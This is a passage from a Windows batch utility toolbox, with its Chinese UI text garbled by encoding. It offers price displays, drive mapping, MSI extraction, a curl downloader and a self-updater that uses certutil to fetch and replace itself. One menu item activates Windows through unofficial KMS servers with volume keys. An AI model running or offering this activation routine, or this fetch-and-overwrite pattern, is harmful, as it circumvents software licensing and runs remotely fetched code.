call :Division !dogetousd! !cnytousd! 8 dogetocny
call :Division !btctousd! !cnytousd! 8 btctocny
call :Division !ethtousd! !cnytousd! 8 ethtocny
call :Division !eurtousd! !cnytousd! 8 eurtocny
call :Division !gbptousd! !cnytousd! 8 gbptocny
call :Division !jpytousd! !cnytousd! 8 jpytocny
call :Division !hkdtousd! !cnytousd! 8 hkdtocny
call :Division !twdtousd! !cnytousd! 8 twdtocny
call :Division !xmrtousd! !cnytousd! 8 xmrtocny
call :Division !filetousd! !cnytousd! 8 filetocny
call :Division 1 !cnytousd! 3 usdtocny
call :Division !autousd! 31.1034768 3 autocny
call :Division !agtousd! 31.1034768 3 agtocny
call :xcf !autocny! !usdtocny! autocny
call :xcf !agtocny! !usdtocny! agtocny
cls
echo;�ƽ�XAU    �� �����CNY
echo;	1  �� !autocny!
echo;
echo;����XAG    �� �����CNY
echo;	1  �� !agtocny!
echo;
echo;��̫��ETH  �� �����CNY
set /p =!cswz1![]	<nul
set /p =1  �� !ethtocny!		24Сʱ�ǵ���: <nul
if "!eth24h:~0,1!" equ "-" (call :colortxt a !eth24h!) else (call :colortxt c +!eth24h!)
set /p =%% <nul
echo;
echo;
echo;���ر�BTC  �� �����CNY
set /p =!cswz1![]	<nul
set /p =1  �� !btctocny!		24Сʱ�ǵ���: <nul
if "!btc24h:~0,1!" equ "-" (call :colortxt a !btc24h!) else (call :colortxt c +!btc24h!)
set /p =%% <nul
echo;
echo;
echo;���ޱ�XMR  �� �����CNY
set /p =!cswz1![]	<nul
set /p =1  �� !xmrtocny!		24Сʱ�ǵ���: <nul
if "!xmr24h:~0,1!" equ "-" (call :colortxt a !xmr24h!) else (call :colortxt c +!xmr24h!)
set /p =%% <nul
echo;
echo;
echo;�ļ���FILE �� �����CNY
set /p =!cswz1![]	<nul
set /p =1  �� !filetocny!		24Сʱ�ǵ���: <nul
if "!file24h:~0,1!" equ "-" (call :colortxt a !file24h!) else (call :colortxt c +!file24h!)
set /p =%% <nul
echo;
echo;
echo;������DOGE �� �����CNY
set /p =!cswz1![]	<nul
set /p =1  �� !dogetocny!			24Сʱ�ǵ���: <nul
if "!doge24h:~0,1!" equ "-" (call :colortxt a !doge24h!) else (call :colortxt c +!doge24h!)
set /p =%% <nul
echo;
echo;
echo;��ԪUSD    �� �����CNY
echo;	1  �� !usdtocny!
echo;
echo;ŷԪEUR    �� �����CNY
echo;	1  �� !eurtocny!
echo;
echo;Ӣ��GBP    �� �����CNY
echo;	1  �� !gbptocny!
echo;
echo;��ԪJPY    �� �����CNY
echo;	1  �� !jpytocny!
echo;
echo;�۱�HKD    �� �����CNY
echo;	1  �� !hkdtocny!
echo;
echo;��̨��TWD  �� �����CNY
echo;	1  �� !twdtocny!
!hx!
set /p =����������ز˵�<nul&pause>nul
endlocal
goto memuv2
:68
setlocal
cls
title ���������̷�!system!
set "cho=120"
echo;[1]��·�����̷�����
echo;[2]ɾ�������̷�
echo;[0]���ز˵�
!hx!
!sel!
if "!shuru!" equ "1" (goto 68.1)
if "!shuru!" equ "2" (goto 68.2)
if "!shuru!" equ "3" (endlocal&goto memuv2)
if "!shuru!" equ "0" (endlocal&goto memuv2)
set /p =��������ȷ��ѡ�<nul
call :out 2
endlocal
goto 68
:68.1
title ��·�����̷�����!system!
cls
for /f "delims=" %%a in ('fsutil fsinfo drives') do (
	set "sypf=%%a"
	set "sypf=!sypf:~5!"
)
echo;��ǰ�����̷�: !sypf!
echo;�����̷�:
for /f "delims=" %%a in ('subst') do (echo;%%a)
!hx!
set newpf=
set /p "newpf=����Ҫ���������̷�:"
call :checkvar newpf az jg
if "!jg!" neq "0" (
	call :strlen newpf jg
	if "!jg!" neq "1" (
		set /p =��Ч����<nul
		call :out 2
		goto 68.1
	)
)
set gllj=
set /p "gllj=����Ҫ������·��: "
call :ljjc gllj dir
if "!errorlevel!" equ "0" (
	set /p =��Ч·��<nul
	call :out 2
	endlocal
	goto 68
)
subst !newpf!: !gllj!
if "!errorlevel!" equ "0" (
	set /p =�����ɹ�<nul
	call :out 2
	endlocal
	goto 68
) else (
	set /p =����ʧ��<nul
	call :out 2
	endlocal
	goto 68
)
:68.2
title ɾ�������̷�!system!
cls
echo;�����̷�:
for /f "delims=" %%a in ('subst') do (echo;%%a)
!hx!
set xzxnp=
set /p "xzxnp=����Ҫж�ص��̷�: "
call :checkvar newpf az jg
if "!jg!" neq "0" (
	call :strlen newpf jg
	if "!jg!" neq "1" (
		set /p =��Ч����<nul
		call :out 2
		goto 68.2
	)
)
subst !xzxnp!: /d
if "!errorlevel!" equ "0" (
	set /p =ж�سɹ�<nul
	call :out 2
	endlocal
	goto 68
) else (
	set /p =ж��ʧ��<nul
	call :out 2
	endlocal
	goto 68
)
:69
setlocal
title ��ѹmsi��װ�ļ�!system!
cls
set msiurl=
set /p "msiurl=����msi�ļ�·��(e=���ز˵�): "
if /i "!msiurl!" equ "e" (
	endlocal
	goto memuv2
)
call :ljjc msiurl
if "!errorlevel!" equ "0" (
	echo;��Ч·��
	call :out 2
	endlocal
	goto 69
)
for /f "delims=" %%a in ("!msiurl!") do (
	if /i "%%~xa" neq ".msi" (
		echo;����msi�ļ�
		call :out 2
		endlocal
		goto 69
	)
)
set msidir=
set /p "msidir=����msi�ļ���ѹ·��(���ܽ�ѹ���Ѵ��ڵ��ļ���, Ĭ��·��Ϊmsi�ļ�����·��)(e=���ز˵�): "
if /i "!msidir!" equ "e" (
	endlocal
	goto memuv2
)
if not defined msidir (
	for /f "delims=" %%a in ("!msiurl!") do (
		set "msidir=%%~dpna"
	)
)
call :lj msidir msidir
echo;��ʼ��ѹ...
if not exist "!msidir!" (
	msiexec /a "!msiurl!" /quiet /passive /qn targetdir="!msidir!"
) else (
	echo;���ܽ�ѹ���Ѵ��ڵ��ļ���
	call :out 2
)
!hx!
set /p =����������ز˵�<nul&pause>nul
endlocal
goto memuv2
:70
setlocal
title ����CMD����̨ɫ�ʱ�!system!
cls
color 07
set cs=0
for /l %%a in (40,1,47) do (
	for /l %%b in (90,1,97) do (
		if %%a lss 10 (set "xh1=0%%a") else (set "xh1=%%a")
		if %%b lss 10 (set "xh2=0%%b") else (set "xh2=%%b")
		if "!xh1!" equ "40" (
			set bj=0
		) else (
			if "!xh1!" equ "41" (
				set bj=4
			) else (
				if "!xh1!" equ "42" (
					set bj=2
				) else (
					if "!xh1!" equ "43" (
						set bj=6
					) else (
						if "!xh1!" equ "44" (
							set bj=1
						) else (
							if "!xh1!" equ "45" (
								set bj=5
							) else (
								if "!xh1!" equ "46" (
									set bj=3
								) else (
									if "!xh1!" equ "47" (
										set bj=7
									)
								)
							)
						)
					)
				)
			)
		)
		if "!xh2!" equ "90" (
			set zt=8
		) else (
			if "!xh2!" equ "91" (
				set zt=c
			) else (
				if "!xh2!" equ "92" (
					set zt=a
				) else (
					if "!xh2!" equ "93" (
						set zt=e
					) else (
						if "!xh2!" equ "94" (
							set zt=9
						) else (
							if "!xh2!" equ "95" (
								set zt=d
							) else (
								if "!xh2!" equ "96" (
									set zt=b
								) else (
									if "!xh2!" equ "97" (
										set zt=f
									)
								)
							)
						)
					)
				)
			)
		)
		if !cs! lss 7 (
			set /p =!cswz!!xh2!;!xh1!m  !bj!!zt!  !cswz!0m<nul
			set /a "cs+=1"
		) else (
			echo;!cswz!!xh2!;!xh1!m  !bj!!zt!  !cswz!0m
			set cs=0
		)
	)
)
set cs=0
for /l %%a in (40,1,47) do (
	for /l %%b in (90,1,97) do (
		if %%a lss 10 (set "xh1=0%%a") else (set "xh1=%%a")
		if %%b lss 10 (set "xh2=0%%b") else (set "xh2=%%b")
		if !cs! lss 7 (
			set /p =!cswz!!xh2!;!xh1!m !xh2!;!xh1!!cswz!0m<nul
			set /a "cs+=1"
		) else (
			echo;!cswz!!xh2!;!xh1!m !xh2!;!xh1!!cswz!0m
			set cs=0
		)
	)
)
for /l %%a in (90,1,97) do (
	for /l %%b in (40,1,47) do (
		if %%a lss 10 (set "xh1=0%%a") else (set "xh1=%%a")
		if %%b lss 10 (set "xh2=0%%b") else (set "xh2=%%b")
		if !cs! lss 7 (
			set /p =!cswz!!xh2!;!xh1!m !xh2!;!xh1!!cswz!0m<nul
			set /a "cs+=1"
		) else (
			echo;!cswz!!xh2!;!xh1!m !xh2!;!xh1!!cswz!0m
			set cs=0
		)
	)
)
set /p =!cswz!s!cswz!27;0H<nul
for /l %%b in (1,1,4) do (
	echo;
	for /l %%a in (255,-13,0) do (set /p =!cswz!48;2;255;0;%%am !cswz!0m<nul)
	for /l %%a in (0,13,255) do (set /p =!cswz!48;2;255;%%a;0m !cswz!0m<nul)
	for /l %%a in (255,-13,0) do (set /p =!cswz!48;2;%%a;255;0m !cswz!0m<nul)
	for /l %%a in (0,13,255) do (set /p =!cswz!48;2;0;255;%%am !cswz!0m<nul)
	for /l %%a in (255,-13,0) do (set /p =!cswz!48;2;0;%%a;255m !cswz!0m<nul)
	for /l %%a in (0,13,255) do (set /p =!cswz!48;2;%%a;0;255m !cswz!0m<nul)
)
set /p =!cswz!u<nul
!hx!
set /p =����������ز˵�<nul&pause>nul
endlocal
goto memuv2
:71
setlocal
title KMS����Windows 10!system!
cls
(
set "Core=TX9XD-98N7V-6WMQ6-BX7FG-H8Q99"
set "CoreCountrySpecific=PVMJN-6DFY6-9CCP6-7BKTT-D3WVR"
set "CoreN=3KHY7-WNT83-DGQKR-F7HPR-844BM"
set "CoreSingleLanguage=7HNRX-D7KGG-3K4RQ-4WPJ4-YTDFH"
set "ProfessionalStudent=YNXW3-HV3VB-Y83VG-KPBXM-6VH3Q"
set "ProfessionalStudentN=8G9XJ-GN6PJ-GW787-MVV7G-GMR99"
set "Professional=W269N-WFGWX-YVC9B-4J6C9-T83GX"
set "ProfessionalN=MH37W-N47XK-V7XM9-C7227-GCQG9"
set "ProfessionalSN=8Q36Y-N2F39-HRMHT-4XW33-TCQR4"
set "ProfessionalWMC=NKPM6-TCVPT-3HRFX-Q4H9B-QJ34Y"
set "Enterprise=NPPR9-FWDCX-D2C8J-H872K-2YT43"
set "EnterpriseN=DPH2V-TTNVB-4X9Q3-TJR4H-KHJW4"
set "Education=NW6C2-QMPVW-D7KKK-3GKT6-VCFB2"
set "EducationN=2WH4N-8QGBV-H22JP-CT43Q-MDWWJ"
set "EnterpriseS=WNMTR-4C88C-JK8YV-HQ7T2-76DF9"
set "EnterpriseSN=2F77B-TNFGY-69QQF-B8YKP-D69TJ"
)
for /f "tokens=3 delims= " %%a in ('reg QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v "EditionID"') do (
	set "sysid=%%a"
)
set server=
if defined !sysid! (echo;ϵͳ����: !system:~3!) else (call :colortxt c û�е�ǰϵͳ�ļ�����Կ&echo;)
ping /4 /n 1 www.baidu.com>nul||call :colortxt c û����������&echo;
echo;��ѡ��KMS������
set "cho=120"
!hx!
echo;[1]kms.loli.best
echo;[2]kms.03k.org
echo;[0]���ز˵�
!hx!
!sel!
if "!shuru!" equ "1" (set "server=kms.loli.best"&goto 71.1)
if "!shuru!" equ "2" (set "server=kms.03k.org"&goto 71.1)
if "!shuru!" equ "3" (endlocal&goto memuv2)
if "!shuru!" equ "0" (endlocal&goto memuv2)
set /p =��Ч����<nul
call :out 2
endlocal
goto 71
:71.1
cls
set /p =KMS������: <nul
call :colortxt a !server!
echo;
set /p =ϵͳ����: <nul
call :colortxt a "!system:~3!"
echo;
if defined sysid (cscript //Nologo %windir%\system32\slmgr.vbs /ipk !%sysid%!)
cscript //Nologo %windir%\system32\slmgr.vbs /skms !server!
cscript //Nologo %windir%\system32\slmgr.vbs /ato
start slmgr.vbs -xpr
!hx!
echo;�����ʾ����ʧ��[����: 0xC004F074]��Ӧ����KMS������.
set /p =����������ز˵�<nul&pause>nul
endlocal
goto memuv2
:72
setlocal
title curl���������!system!
cls
if not exist "%systemroot%\system32\curl.exe" (
	if not exist .\curl.exe (
		echo;û���ҵ�curl.exe
		call :out 2
		setlocal
		goto memuv2
	)
)
:72.1
cls
set filename=
set url=
set /p "url=������������(e=����): "
if not defined url (
	echo;���Ӳ���Ϊ��!
	call :out 2
	goto 72.1
)
if /i "!url!" equ "e" (
	endlocal
	goto memuv2
)
set tr=
set /p "tr=�������ؽ�����(Ĭ��16): "
if not defined tr (set tr=16)
set tr|findstr "\<[0-9]*\>">nul
if "!errorlevel!" neq "0" (
	echo;ֻ����������!
	call :out 2
	goto 72.1
)
set dir=
set /p "dir=���뱣��·��(Ĭ�ϵ�ǰDOS����������·��): "
if not defined dir (
	for /f "delims=" %%a in ("!weizhi!") do (set "dir=%%~dpa")
)
if not exist "!dir!" (
	echo;·�� !dir! ������
	call :out 2
	goto 72.1
)
dir /ad !dir!>nul 2>nul||(
	echo;·�� !dir! ����һ���ļ���
	call :out 2
	goto 72.1
)
cls
echo;��ʼ��ȡ�ļ���Ϣ...
set filename=
if exist "%temp%\tag" (del /f /q "%temp%\tag")
for /f "skip=1 tokens=3 delims= " %%a in ('"reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable"') do (
	if "%%a" equ "0x1" (
		for /f "skip=1 tokens=3 delims= " %%b in ('"reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer"') do (
			set "proxy=-x %%b"
			echo;ʹ�ô���:	%%b
		)
	) else (
		set proxy=
	)
)
curl !proxy! !doh! -A "!ua!" -I --compressed -# -L -o tag --connect-timeout 5 --output-dir "%temp%" "!url!"
if not exist "%temp%\tag" (
	echo;û�л�ȡ���ļ���Ϣ
	!hx!
	set /p =����������ز˵�<nul&pause>nul
	endlocal
	goto memuv2
)
for /f "tokens=2 delims= " %%a in ('type %temp%\tag^|findstr /c:"Accept-Ranges:"') do (set "trflag=%%a")
for /f "tokens=2 delims= " %%a in ('type %temp%\tag^|findstr /c:"Content-Length:"') do (set "filesize=%%a")
for /f "tokens=2 delims==" %%a in ('type %temp%\tag^|findstr /c:"filename="') do (set "filename=%%a")
if "!trflag!" neq "bytes" (set tr=1)
if defined filesize (
	call :xdwjs !filesize! b dw
) else (
	set "dw=δ֪ (תΪ����������)"
)
if not defined filename (set /p "filename=�����ļ���: ")
if not defined filename (set filename=curl�����ļ�)
set /a "fd=filesize/tr"
set /a "ys=filesize%%tr"
set oldfd=0
set /a "pdtr=tr-1"
set /a "newfd=fd-1"
set /a "pdfd=fd+ys"
set file=
for /l %%a in (1,1,!tr!) do (set "file=!file!%%a+")
set newtr=
set /a "newtr=tr+1"
set "file=!file:~0,-1!"
cls
echo;�ļ���:		!filename!
echo;�ļ���С:	!dw!
if "!trflag!" neq "bytes" (echo;�����Ӳ�֧�ֶ��̴߳���,�������Զ�����Ϊ1)
echo;������:		!tr!
echo;����Ƭ�δ�С:	!fd!+!ys!
echo;����·��:	!dir!
!hx!
set /p =���������ʼ����<nul&pause>nul
cls
echo;��ʼ�����ļ�...
if not defined filesize (goto 72.3)
title curl��������� - �ȴ��ļ��������(��e���ز˵�)!system!
if exist "%temp%\down" (rd /s /q "%temp%\down")
md "%temp%\down"
set "kssj=!time!"
for /f "skip=1 tokens=3 delims= " %%a in ('"reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable"') do (
	if "%%a" equ "0x1" (
		for /f "skip=1 tokens=3 delims= " %%b in ('"reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer"') do (
			set "proxy=-x %%b"
			echo;ʹ�ô���:	%%b
		)
	) else (
		set proxy=
	)
)
for /l %%a in (1,1,!tr!) do (
	start /min /low "curl���������_!tr!" ^
	curl !proxy! !doh! -A "!ua!" --compressed -# -L -C - --retry 2 --retry-delay 1 --connect-timeout 5 -r !oldfd!-!newfd! -o %%a --output-dir "%temp%\down" "!url!"
	set /a "oldfd=newfd+1"
	if "%%a" equ "!pdtr!" (set newfd=) else (set /a "newfd=oldfd+fd-1")
)
pushd "%temp%\down"
cls
:72.2
(
cls
set /p =!cswz!s!cswz!0;0H<nul
set jccs=
set jingdu=
set /p =!cswz!0;76H<nul
call :colortxt a �ȴ��ļ��������^(��e���ز˵�^)...
set /p =!cswz!u<nul
)
for /l %%a in (1,1,!tr!) do (
	set "ssdx=%%~za"
	if not defined ssdx (set ssdx=0)
	if "%%a" equ "!tr!" (
		if "!ssdx!" equ "!pdfd!" (
			echo;����%%a���
			set /a "jccs+=1"
		) else (
			set fhz=
			call :cf !ssdx! !pdfd! 2 fhz
			set "jcjd=!fhz:~2,2!"
			if "!jcjd:~0,1!" equ "0" (set "jcjd=!jcjd:~1,1!")
			set jdt=
			for /l %%c in (1,2,!jcjd!) do (set "jdt=!jdt!:")
			set /p =����%%a�Ľ���:	[<nul
			call :colortxt a !jdt!
			echo;][!fhz!~1]
		)
	) else (
		if "!ssdx!" equ "!fd!" (
			echo;����%%a���
			set /a "jccs+=1"
		) else (
			set fhz=
			call :cf !ssdx! !fd! 2 fhz
			set "jcjd=!fhz:~2,2!"
			if "!jcjd:~0,1!" equ "0" (set "jcjd=!jcjd:~1,1!")
			set jdt=
			for /l %%c in (1,2,!jcjd!) do (set "jdt=!jdt!:")
			set /p =����%%a�Ľ���:	[<nul
			call :colortxt a !jdt!
			echo;][!fhz!~1]
		)
	)
)
choice /c 1e /t 1 /d 1 >nul
if "!errorlevel!" equ "2" (
	taskkill /fi "windowtitle eq curl���������_*" /fi "imagename eq curl.exe" /f
	popd
	rd /s /q "%temp%\down"
	del "%temp%\tag"
	endlocal
	goto memuv2
)
if "!jccs!" neq "!tr!" (goto 72.2)
set "jssj=!time!"
cls
echo;�ϲ��ļ���...
if "!dir:~-1!" neq "\" (set "dir=!dir!\")
copy /b /z !file! "!dir!!filename!"
popd
rd /s /q "%temp%\down"
del /f /q "%temp%\tag"
:72.4
cls
title curl���������!system!
if "!dir:~-1!" neq "\" (set "dir=!dir!\")
if exist "!dir!!filename!" (
	for /f "delims=" %%a in ("!dir!!filename!") do (
		echo;���������ٶ�...
		call :sjc !kssj! !jssj! raw
		call :sjc !kssj! !jssj! xzys format
		call :Division !raw! 1000 3 xzsd
		call :Division !filesize! !xzsd! 3 sd
		call :xdwjs !sd! d dw
		forfiles /p %~dp0 /m %~nx0 /c "%comspec% /c set /p =0x07<nul"
		cls
		echo;�������
		echo;����:		!url!
		echo;��ʱ:		!xzys!
		echo;ƽ�������ٶ�:  !size! !dw!/s
		echo;�ļ�:		%%~nxa
		if %%~za geq 1024 (
			call :xdwjs %%~za b dw
			echo;�ļ���С:	%%~za�ֽ� Լ!dw!
		) else (
			echo;�ļ���С:	%%~za�ֽ�
		)
		echo;����·��:	%%~dpa
	)
) else (
	forfiles /p %~dp0 /m %~nx0 /c "%comspec% /c set /p =0x07<nul"
	cls
	echo;����:	!url!
	echo;����ʧ��
)
!hx!
set /p =����������ز˵�<nul&pause>nul
endlocal
goto memuv2
:72.3
for /f "skip=1 tokens=3 delims= " %%a in ('"reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable"') do (
	if "%%a" equ "0x1" (
		for /f "skip=1 tokens=3 delims= " %%b in ('"reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer"') do (
			set "proxy=-x %%b"
			echo;ʹ�ô���:	%%b
		)
	) else (
		set proxy=
	)
)
if "!dir:~-1!" equ "\" (set "dir=!dir:~0,-1!")
set "kssj=!time!"
curl !proxy! !doh! -A "!ua!" --compressed -# -L -C - --retry 2 --retry-delay 1 --connect-timeout 5 -o "!filename!" --output-dir "!dir!" "!url!"
set "jssj=!time!"
for /f "delims=" %%a in ("!dir!\!filename!") do (set "filesize=%%~za")
goto 72.4
:hash
setlocal
for /f "delims=" %%a in ("%1") do (set "url=%%~a")
set "shuanfa=%2"
if "!shuanfa!" equ "" (set "shuanfa=sha256")
for /f "skip=1 eol=C" %%a in ('"certutil -hashfile "!url!" !shuanfa!"') do (
	if "%3" neq "" (
		endlocal&set "%3=%%a"
		goto :eof
	) else (
		echo;%%a
		goto :eof
	)
	
)
goto :eof
::for /f "delims=" %%a in ('"powershell get-filehash %url% -algorithm %shuanfa%^|select-object hash^|format-list"') do (set hash=%%a)
::set hash=%hash:~7%
:update
setlocal
cls
title ����DOS������ - ��ǰ�汾: !ver!!system!
set resolve2=--resolve raw.github.io:443:^
185.199.110.133,^
185.199.109.133,^
185.199.111.133,^
185.199.108.133,^
2606:50c0:8001::154,^
2606:50c0:8003::154,^
2606:50c0:8000::154,^
2606:50c0:8002::154
set "jshost=-H "host: cdn.jsdelivr.net""
set "githost=-H "host: raw.githubusercontent.com""
set "gxurlhost1=https://raw.github.io/Trustedinstall/dostool/main/update.js"
set "gxurlhost2=https://cdn.jsdelivr.net/gh/Trustedinstall/dostool/update.js"
set "gxurl1=https://raw.githubusercontent.com/Trustedinstall/dostool/main/update.js"
set "gxurl2=https://cdn.jsdelivr.net/gh/Trustedinstall/dostool/update.js"
set "gxdoshost1=https://raw.github.io/Trustedinstall/dostool/main/dostool.js"
set "gxdoshost2=https://cdn.jsdelivr.net/gh/Trustedinstall/dostool/dostool.js"
set "gxdos1=https://raw.githubusercontent.com/Trustedinstall/dostool/main/dostool.js"
set "gxdos2=https://cdn.jsdelivr.net/gh/Trustedinstall/dostool/dostool.js"
echo;������°汾...
if exist "%temp%\dostoolupdate" (del /f /q "%temp%\dostoolupdate")
if exist "%systemroot%\system32\curl.exe" (
	pushd "%temp%"
	for /f "skip=1 tokens=3 delims= " %%a in ('"reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable"') do (
		if "%%a" equ "0x1" (
			for /f "skip=1 tokens=3 delims= " %%b in ('"reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer"') do (
				set "proxy=-x %%b"
				echo;ʹ�ô���:	%%b
			)
		) else (
			set proxy=
		)
	)
	echo;ʹ������:	!gxurlhost1!
	echo;Host����:	!githost:~10,-1!
	curl !proxy! !doh! !githost! -A "!ua!" --compressed -L -# -C - --retry 2 --retry-delay 1 --connect-timeout 5 !resolve2! -o dostoolupdate !gxurlhost1!
	if exist "%temp%\dostoolupdate" (
		for /f "usebackq delims=: tokens=1-3" %%a in ("%temp%\dostoolupdate") do (
			set "gxver=%%a"
			set "doshash=%%b"
			set "dossize=%%c"
			set "host=!githost!"
			set "resolve=!doh! !resolve2!"
			set "url=!gxdoshost1!"
		)
		popd
		goto updatecheck
	) else (
		echo;ʹ������:	!gxurl1!
		curl !proxy! !doh! -A "!ua!" --compressed -L -# -C - --retry 2 --retry-delay 1 --connect-timeout 5 -o dostoolupdate !gxurl1!
		if exist "%temp%\dostoolupdate" (
			for /f "usebackq delims=: tokens=1-3" %%a in ("%temp%\dostoolupdate") do (
				set "gxver=%%a"
				set "doshash=%%b"
				set "dossize=%%c"
				set host=
				set resolve=
				set "url=!gxdos1!"
			)
			popd
			goto updatecheck
		) else (
			echo;ʹ������:	!gxurlhost2!
			echo;Host����:	!jshost:~10,-1!
			curl !proxy! !doh! !jshost! -A "!ua!" --compressed -L -# -C - --retry 2 --retry-delay 1 --connect-timeout 5 !resolve2! -o dostoolupdate !gxurlhost2!
			if exist "%temp%\dostoolupdate" (
				for /f "usebackq delims=: tokens=1-3" %%a in ("%temp%\dostoolupdate") do (
					set "gxver=%%a"
					set "doshash=%%b"
					set "dossize=%%c"
					set "host=!jshost!"
					set "resolve=!doh! !resolve2!"
					set "url=!gxdoshost2!"
				)
				popd
				goto updatecheck
			) else (
				echo;ʹ������:	!gxurl2!
				curl !proxy! !doh! -A "!ua!" --compressed -L -# -C - --retry 2 --retry-delay 1 --connect-timeout 5 -o dostoolupdate !gxurl2!
				if exist "%temp%\dostoolupdate" (
					for /f "usebackq delims=: tokens=1-3" %%a in ("%temp%\dostoolupdate") do (
						set "gxver=%%a"
						set "doshash=%%b"
						set "dossize=%%c"
						set host=
						set resolve=
						set "url=!gxdos2!"
					)
					popd
					goto updatecheck
				) else (
					echo;û�м�鵽���°汾
					!hx!
					set /p =����������ز˵�<nul&pause>nul
					endlocal
					set verbak=
					goto memuv2
				)
			)
		)
	)
) else (
	echo;ʹ������:	!gxurl1!
	certutil -urlcache -split -f !gxurl1! "%temp%\dostoolupdate"
	if exist "%temp%\dostoolupdate" (
		for /f "usebackq delims=: tokens=1-3" %%a in ("%temp%\dostoolupdate") do (
			set "gxver=%%a"
			set "doshash=%%b"
			set "dossize=%%c"
			set "url=!gxdos1!"
		)
		goto updatecheck
	) else (
		echo;ʹ������:	!gxurl2!
		certutil -urlcache -split -f !gxurl2! "%temp%\dostoolupdate"
		if exist "%temp%\dostoolupdate" (
			for /f "usebackq delims=: tokens=1-3" %%a in ("%temp%\dostoolupdate") do (
				set "gxver=%%a"
				set "doshash=%%b"
				set "dossize=%%c"
				set "url=!gxdos2!"
			)
			goto updatecheck
		) else (
			echo;û�м�鵽���°汾
			!hx!
			set /p =����������ز˵�<nul&pause>nul
			endlocal
			set verbak=
			goto memuv2
		)
	)
)
:updatecheck
cls
set /a "checkver=gxver-verbak"
if !checkver! gtr 0 (
	set /p =��鵽���°汾: <nul
	call :colortxt a !gxver!
	call :xdwjs %~z0 b old
	call :xdwjs !dossize! b new
	call :hash "!weizhi!" sha1 oldhash
	echo;
	echo;�ļ���С: !old!��%~z0 �ֽڣ��� !new!��!dossize! �ֽڣ�
	echo;SHA1: !oldhash! �� !doshash!
	!hx!
	set shuru=
	set /p "shuru=���س������£���e���ز˵�:"
	if "!shuru!" equ "" (goto startupdate)
	if /i "!shuru!" equ "e" (
		del /f /q "%temp%\dostoolupdate"
		endlocal
		set verbak=
		goto memuv2
	)
	set /p =������Ч<nul
	call :out 2
	goto updatecheck
) else (
	del /f /q "%temp%\dostoolupdate"
	echo;û�м�鵽���°汾
	!hx!
	set /p =����������ز˵�<nul&pause>nul
	endlocal
	set verbak=
	goto memuv2
)
:startupdate
cls
echo;�������ظ���...
if exist "%temp%\dostool" (del /f /q "%temp%\dostool")
if exist "%systemroot%\system32\curl.exe" (
	pushd "%temp%"
	for /f "skip=1 tokens=3 delims= " %%a in ('"reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable"') do (
		if "%%a" equ "0x1" (
			for /f "skip=1 tokens=3 delims= " %%b in ('"reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer"') do (
				set "proxy=-x %%b"
				echo;ʹ�ô���:	%%b
			)
		) else (
			set proxy=
		)
	)
	echo;ʹ������:	!url!
	if defined host (echo;Host����:	!host:~10,-1!)
	curl !proxy! !doh! !host! -A "!ua!" --compressed -L -# -C - --retry 2 --retry-delay 1 --connect-timeout 5 !resolve2! -o dostool !url!
	popd
	call :hash "%temp%\dostool" sha1 hash
	if /i "!hash!" equ "!doshash!" (
		endlocal
		endlocal
		copy /z /y "%temp%\dostool" %0&goto chushihua
	) else (
		call :colortxt c �ļ���Ч
		echo;
		call :out 2
		endlocal
		set verbak=
		goto memuv2
	)
) else (
	certutil -urlcache -split -f !url! "%temp%\dostool"
	call :hash "%temp%\dostool" sha1 hash
	if /i "!hash!" equ "!doshash!" (
		endlocal
		endlocal
		copy /z /y "%temp%\dostool" %0&goto chushihua
	) else (
		call :colortxt c �ļ���Ч
		echo;
		call :out 2
		endlocal
		set verbak=
		goto memuv2
	)
)
::bitsadmin /transfer ���ظ�����... /priority FOREGROUND https://cdn.jsdelivr.net/gh/Trustedinstall/dostool/dostool.js %weizhi%&start %comspec% /c %0&exit 0
:sjc
REM ����: ��ʼʱ��ͽ���ʱ�䣬��ʽΪ HH:MM:SS.mm
setlocal
set "start_time=%1"
set "end_time=%2"
REM ������ʼʱ��
for /f "tokens=1-4 delims=:. " %%a in ("!start_time!") do (
    set "start_hour=%%a"
    set "start_minute=%%b"
    set "start_second=%%c"
    set "start_millisecond=%%d"
)
REM ��������ʱ��
for /f "tokens=1-4 delims=:. " %%a in ("!end_time!") do (
    set "end_hour=%%a"
    set "end_minute=%%b"
    set "end_second=%%c"
    set "end_millisecond=%%d"
)
REM ȥ��ǰ���㲢ȷ����ʮ���Ƹ�ʽ���м���
for %%i in (start_hour start_minute start_second start_millisecond end_hour end_minute end_second end_millisecond) do (
    set "%%i=!%%i: =!"
    set /a "%%i=1!%%i! - 100"
)
REM ����ʱ�����룩
set /a "time_difference-=start_hour*3600000+start_minute*60000+start_second*1000+start_millisecond*10"
set /a "time_difference+=end_hour*3600000+end_minute*60000+end_second*1000+end_millisecond*10"
REM ����������
if !time_difference! lss 0 (set /a "time_difference+=86400000")
REM ת��ʱ���Ϊ HH:MM:SS.mm ��ʽ
set /a "diff_hours=time_difference/3600000"
set /a "diff_minutes=(time_difference%%3600000)/60000"
set /a "diff_seconds=(time_difference%%60000)/1000"
set /a "diff_milliseconds=(time_difference%%1000)/10"
REM ��ʽ�����
if !diff_hours! lss 10 (set "diff_hours=0!diff_hours!")
if !diff_minutes! lss 10 (set "diff_minutes=0!diff_minutes!")
if !diff_seconds! lss 10 (set "diff_seconds=0!diff_seconds!")
if !diff_milliseconds! lss 10 (set "diff_milliseconds=0!diff_milliseconds!")
set "time_diff=!diff_hours!:!diff_minutes!:!diff_seconds!.!diff_milliseconds!"
if "%4" equ "format" (
	for /f "tokens=1-3 delims=:" %%a in ("!time_diff!") do (
		if "%%a" equ "00" (
			if "%%b" equ "00" (
				set "time_diff=%%c��"
			) else (
				set "time_diff=%%b��%%c��"
			)
		) else (
			set "time_diff=%%aСʱ%%b��%%c��"
		)
	)
)
if "%3" equ "" (
	echo;!time_diff!
) else (
	if "%3" equ "raw" (
		endlocal&set "%3=%time_difference%"
	) else (
